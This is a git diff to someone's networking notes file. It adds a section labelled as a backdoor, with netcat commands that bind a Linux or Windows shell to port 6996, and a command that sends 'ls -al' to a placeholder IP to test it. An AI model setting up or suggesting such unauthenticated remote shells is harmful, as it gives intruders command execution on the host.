@@ -31,6 +31,21 @@ https://unix.stackexchange.com/questions/10428/simple-way-to-create-a-tunnel-fro
 
 Another way is to use socks proxy in SSHD to forward all traffic
 
+## nc command to create a backdoor
+Linux
+```
+nc -lk -p 6996 -e /bin/bash
+```
+or  Win
+```
+nc -lk -p 6996 -e cmd
+```
+
+Test backdoor: 
+```
+echo "ls -al " | nc -v xxx.xxx.xx.xxx 6996 
+```
+
 ## convert a socket to local file and communicate with it
 comes from: 
 ```bash
